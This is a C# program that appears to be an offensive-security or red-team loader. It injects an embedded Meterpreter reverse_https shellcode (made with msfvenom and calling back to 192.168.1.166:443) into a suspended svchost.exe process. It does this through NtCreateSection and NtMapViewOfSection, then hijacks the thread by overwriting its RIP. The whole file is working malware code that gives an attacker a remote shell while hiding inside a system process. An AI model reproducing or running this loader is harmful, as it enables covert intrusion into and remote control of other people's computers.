﻿using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Runtime.InteropServices;

namespace Process_Injection___Thread_Hijack_ntdll
{
    class Program
    {
        public const uint CREATE_SUSPENDED = 0x4;

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }


        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        public struct THREADENTRY32
        {
            internal UInt32 dwSize;
            internal UInt32 cntUsage;
            internal UInt32 th32ThreadID;
            internal UInt32 th32OwnerProcessID;
            internal UInt32 tpBasePri;
            internal UInt32 tpDeltaPri;
            internal UInt32 dwFlags;
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct FLOATING_SAVE_AREA
        {
            public uint ControlWord;
            public uint StatusWord;
            public uint TagWord;
            public uint ErrorOffset;
            public uint ErrorSelector;
            public uint DataOffset;
            public uint DataSelector;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 80)]
            public byte[] RegisterArea;
            public uint Cr0NpxState;
        }


        public enum CONTEXT_FLAGS : uint
        {
            CONTEXT_i386 = 0x10000,
            CONTEXT_i486 = 0x10000,   //  same as i386
            CONTEXT_CONTROL = CONTEXT_i386 | 0x01, // SS:SP, CS:IP, FLAGS, BP
            CONTEXT_INTEGER = CONTEXT_i386 | 0x02, // AX, BX, CX, DX, SI, DI
            CONTEXT_SEGMENTS = CONTEXT_i386 | 0x04, // DS, ES, FS, GS
            CONTEXT_FLOATING_POINT = CONTEXT_i386 | 0x08, // 387 state
            CONTEXT_DEBUG_REGISTERS = CONTEXT_i386 | 0x10, // DB 0-3,6,7
            CONTEXT_EXTENDED_REGISTERS = CONTEXT_i386 | 0x20, // cpu specific extensions
            CONTEXT_FULL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS,
            CONTEXT_ALL = CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_SEGMENTS | CONTEXT_FLOATING_POINT | CONTEXT_DEBUG_REGISTERS | CONTEXT_EXTENDED_REGISTERS
        }


        [StructLayout(LayoutKind.Sequential)]
        public struct M128A
        {
            public ulong High;
            public long Low;

            public override string ToString()
            {
                return string.Format("High:{0}, Low:{1}", this.High, this.Low);
            }
        }


        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct XSAVE_FORMAT64
        {
            public ushort ControlWord;
            public ushort StatusWord;
            public byte TagWord;
            public byte Reserved1;
            public ushort ErrorOpcode;
            public uint ErrorOffset;
            public ushort ErrorSelector;
            public ushort Reserved2;
            public uint DataOffset;
            public ushort DataSelector;
            public ushort Reserved3;
            public uint MxCsr;
            public uint MxCsr_Mask;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
            public M128A[] FloatRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 16)]
            public M128A[] XmmRegisters;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 96)]
            public byte[] Reserved4;
        }


        [StructLayout(LayoutKind.Sequential, Pack = 16)]
        public struct CONTEXT64
        {
            public ulong P1Home;
            public ulong P2Home;
            public ulong P3Home;
            public ulong P4Home;
            public ulong P5Home;
            public ulong P6Home;

            public CONTEXT_FLAGS ContextFlags;
            public uint MxCsr;

            public ushort SegCs;
            public ushort SegDs;
            public ushort SegEs;
            public ushort SegFs;
            public ushort SegGs;
            public ushort SegSs;
            public uint EFlags;

            public ulong Dr0;
            public ulong Dr1;
            public ulong Dr2;
            public ulong Dr3;
            public ulong Dr6;
            public ulong Dr7;

            public ulong Rax;
            public ulong Rcx;
            public ulong Rdx;
            public ulong Rbx;
            public ulong Rsp;
            public ulong Rbp;
            public ulong Rsi;
            public ulong Rdi;
            public ulong R8;
            public ulong R9;
            public ulong R10;
            public ulong R11;
            public ulong R12;
            public ulong R13;
            public ulong R14;
            public ulong R15;
            public ulong Rip;

            public XSAVE_FORMAT64 DUMMYUNIONNAME;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 26)]
            public M128A[] VectorRegister;
            public ulong VectorControl;

            public ulong DebugControl;
            public ulong LastBranchToRip;
            public ulong LastBranchFromRip;
            public ulong LastExceptionToRip;
            public ulong LastExceptionFromRip;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr GetCurrentProcess();


        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION
            lpProcessInformation);


        [DllImport("kernel32.dll")]
        static extern bool Thread32First(IntPtr hSnapshot, ref THREADENTRY32 lpte);

        [DllImport("kernel32.dll")]
        static extern bool Thread32Next(IntPtr hSnapshot, ref THREADENTRY32 lpte);


        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);


        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern int SuspendThread(IntPtr hThread);


        [DllImport("ntdll.dll")]
        public static extern UInt32 NtCreateSection(
           ref IntPtr section,
           UInt32 desiredAccess,
           IntPtr pAttrs,
           ref long MaxSize,
           uint pageProt,
           uint allocationAttribs,
           IntPtr hFile);

        [DllImport("ntdll.dll")]
        public static extern UInt32 NtMapViewOfSection(
            IntPtr SectionHandle,
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            IntPtr ZeroBits,
            IntPtr CommitSize,
            ref long SectionOffset,
            ref long ViewSize,
            uint InheritDisposition,
            uint AllocationType,
            uint Win32Protect);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtUnmapViewOfSection(
            IntPtr hProc,
            IntPtr baseAddr);

        [DllImport("ntdll.dll", ExactSpelling = true, SetLastError = false)]
        static extern int NtClose(IntPtr hObject);


        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        static void Main(string[] args)
        {
            /*
            cosmic @kali:~$ msfvenom - p windows / x64 / meterpreter / reverse_https LHOST = 192.168.1.166 LPORT = 443 EXITFUNC = thread - f csharp > / tmp / met.cs
            [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
            [-] No arch selected, selecting arch: x64 from the payload
            No encoder specified, outputting raw payload
            Payload size: 666 bytes
            Final size of csharp file: 3406 bytes
            */

            byte[] buf = new byte[610] {
            0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,
            0x48,0x31,0xd2,0x51,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,
            0x52,0x20,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x8b,0x72,0x50,
            0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,
            0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,
            0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,
            0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,0x8b,
            0x40,0x20,0x50,0x8b,0x48,0x18,0x49,0x01,0xd0,0xe3,0x56,0x4d,0x31,0xc9,0x48,
            0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,
            0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,
            0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
            0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,
            0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48,
            0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,
            0x4b,0xff,0xff,0xff,0x5d,0x48,0x31,0xdb,0x53,0x49,0xbe,0x77,0x69,0x6e,0x69,
            0x6e,0x65,0x74,0x00,0x41,0x56,0x48,0x89,0xe1,0x49,0xc7,0xc2,0x4c,0x77,0x26,
            0x07,0xff,0xd5,0x53,0x53,0x48,0x89,0xe1,0x53,0x5a,0x4d,0x31,0xc0,0x4d,0x31,
            0xc9,0x53,0x53,0x49,0xba,0x3a,0x56,0x79,0xa7,0x00,0x00,0x00,0x00,0xff,0xd5,
            0xe8,0x0e,0x00,0x00,0x00,0x31,0x39,0x32,0x2e,0x31,0x36,0x38,0x2e,0x31,0x2e,
            0x31,0x36,0x36,0x00,0x5a,0x48,0x89,0xc1,0x49,0xc7,0xc0,0xbb,0x01,0x00,0x00,
            0x4d,0x31,0xc9,0x53,0x53,0x6a,0x03,0x53,0x49,0xba,0x57,0x89,0x9f,0xc6,0x00,
            0x00,0x00,0x00,0xff,0xd5,0xe8,0x38,0x00,0x00,0x00,0x2f,0x71,0x4a,0x70,0x55,
            0x61,0x6c,0x33,0x65,0x35,0x35,0x6d,0x36,0x62,0x37,0x74,0x74,0x32,0x4e,0x69,
            0x58,0x33,0x67,0x68,0x4d,0x48,0x55,0x78,0x4c,0x56,0x37,0x46,0x59,0x7a,0x5f,
            0x41,0x66,0x4c,0x76,0x48,0x78,0x5f,0x52,0x6b,0x79,0x67,0x4c,0x55,0x42,0x36,
            0x47,0x57,0x49,0x78,0x56,0x00,0x48,0x89,0xc1,0x53,0x5a,0x41,0x58,0x4d,0x31,
            0xc9,0x53,0x48,0xb8,0x00,0x32,0xa8,0x84,0x00,0x00,0x00,0x00,0x50,0x53,0x53,
            0x49,0xc7,0xc2,0xeb,0x55,0x2e,0x3b,0xff,0xd5,0x48,0x89,0xc6,0x6a,0x0a,0x5f,
            0x48,0x89,0xf1,0x6a,0x1f,0x5a,0x52,0x68,0x80,0x33,0x00,0x00,0x49,0x89,0xe0,
            0x6a,0x04,0x41,0x59,0x49,0xba,0x75,0x46,0x9e,0x86,0x00,0x00,0x00,0x00,0xff,
            0xd5,0x4d,0x31,0xc0,0x53,0x5a,0x48,0x89,0xf1,0x4d,0x31,0xc9,0x4d,0x31,0xc9,
            0x53,0x53,0x49,0xc7,0xc2,0x2d,0x06,0x18,0x7b,0xff,0xd5,0x85,0xc0,0x75,0x1f,
            0x48,0xc7,0xc1,0x88,0x13,0x00,0x00,0x49,0xba,0x44,0xf0,0x35,0xe0,0x00,0x00,
            0x00,0x00,0xff,0xd5,0x48,0xff,0xcf,0x74,0x02,0xeb,0xaa,0xe8,0x55,0x00,0x00,
            0x00,0x53,0x59,0x6a,0x40,0x5a,0x49,0x89,0xd1,0xc1,0xe2,0x10,0x49,0xc7,0xc0,
            0x00,0x10,0x00,0x00,0x49,0xba,0x58,0xa4,0x53,0xe5,0x00,0x00,0x00,0x00,0xff,
            0xd5,0x48,0x93,0x53,0x53,0x48,0x89,0xe7,0x48,0x89,0xf1,0x48,0x89,0xda,0x49,
            0xc7,0xc0,0x00,0x20,0x00,0x00,0x49,0x89,0xf9,0x49,0xba,0x12,0x96,0x89,0xe2,
            0x00,0x00,0x00,0x00,0xff,0xd5,0x48,0x83,0xc4,0x20,0x85,0xc0,0x74,0xb2,0x66,
            0x8b,0x07,0x48,0x01,0xc3,0x85,0xc0,0x75,0xd2,0x58,0xc3,0x58,0x6a,0x00,0x59,
            0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff,0xd5 };

            // Create the section handle.
            IntPtr ptr_section_handle = IntPtr.Zero;
            long buffer_size = buf.Length;
            UInt32 SECTION_MAP_WRITE = 0x0002;
            UInt32 SECTION_MAP_READ = 0x0004;
            UInt32 SECTION_MAP_EXECUTE = 0x0008;
            UInt32 SECTION_ALL_ACCESS = SECTION_MAP_WRITE | SECTION_MAP_READ | SECTION_MAP_EXECUTE;
            uint PAGE_EXECUTE_READWRITE = 0x40;
            uint SEC_COMMIT = 0x08000000;
            UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, SECTION_ALL_ACCESS, IntPtr.Zero, ref buffer_size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, IntPtr.Zero);
            if (create_section_status != 0 || ptr_section_handle == IntPtr.Zero)
            {
                Console.WriteLine("[-] An error occured while creating the section.");
                return;
            }
            Console.WriteLine("[+] The section has been created successfully.");
            Console.WriteLine("[*] ptr_section_handle: 0x" + String.Format("{0:X}", (ptr_section_handle).ToInt64()));


            // Map a view of a section into the virtual address space of the current process.
            long local_section_offset = 0;
            uint PAGE_READWRITE = 0x4;
            IntPtr ptr_local_section_addr = IntPtr.Zero;
            UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, GetCurrentProcess(), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, PAGE_READWRITE);
            if (local_map_view_status != 0 || ptr_local_section_addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] An error occured while mapping the view within the local section.");
                return;
            }
            Console.WriteLine("[+] The local section view's been mapped successfully with PAGE_READWRITE access.");
            Console.WriteLine("[*] ptr_local_section_addr: 0x" + String.Format("{0:X}", (ptr_local_section_addr).ToInt64()));

            // Copy the shellcode into the mapped section.
            Marshal.Copy(buf, 0, ptr_local_section_addr, buf.Length);


            //Run host process
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            if (res == false)
            {
                Console.WriteLine("CreateProcess failed");
                return;
            }
            Console.WriteLine("[*] Created process ID: " + pi.dwProcessId);
            Console.WriteLine("[*] Created Thread ID: " + pi.dwThreadId);


            IntPtr ptr_remote_section_addr = IntPtr.Zero;
            uint PAGE_EXECUTE_READ = 0x20;
            UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, pi.hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, PAGE_EXECUTE_READ);
            if (remote_map_view_status != 0 || ptr_remote_section_addr == IntPtr.Zero)
            {
                Console.WriteLine("[-] An error occured while mapping the view within the remote section.");
                return;
            }
            Console.WriteLine("[+] The remote section view's been mapped successfully with PAGE_EXECUTE_READ access.");
            Console.WriteLine("[*] ptr_remote_section_addr: 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));




            // Get RIP (only works on 64 bits applications
            CONTEXT64 context = new CONTEXT64();
            context.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
            if (GetThreadContext(pi.hThread, ref context))
            {
                Console.WriteLine("[*] Original thread RIP: 0x" + String.Format("{0:X}", (ulong)context.Rip));

            }
            else
            {
                Console.WriteLine("[-] GetThreadContext failed");
                return;
            }



            // Unmap the view of the section from the current process & close the handle.
            NtUnmapViewOfSection(GetCurrentProcess(), ptr_local_section_addr);
            NtClose(ptr_section_handle);


            // Set RIP to our shellcode
            context.Rip = (ulong)ptr_remote_section_addr;

            if (SetThreadContext(pi.hThread, ref context))
            {
                Console.WriteLine("[*] Modified thread RIP at: 0x" + String.Format("{0:X}", (ptr_remote_section_addr).ToInt64()));
            }
            else
            {
                Console.WriteLine("[-] SetThreadContext failed");
                return;
            }

            // Resume thread
            Console.WriteLine("[+] Resuming Thread to execute the shellcode...");
            ResumeThread(pi.hThread);
        }
    }
}
